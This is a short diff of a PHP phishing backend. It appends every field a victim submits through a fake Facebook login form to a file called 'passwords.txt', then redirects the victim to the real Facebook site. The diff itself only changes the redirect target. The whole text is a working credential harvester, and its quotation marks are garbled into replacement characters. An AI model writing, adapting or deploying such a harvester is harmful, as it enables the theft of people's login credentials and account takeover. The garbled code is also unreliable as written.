@@ -1,5 +1,5 @@
-<?php
-header (�Location: facebook-login.html);
+﻿<?php
+header (�Location: www.facebook.com);
 $handle = fopen(�passwords.txt�, �a�);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
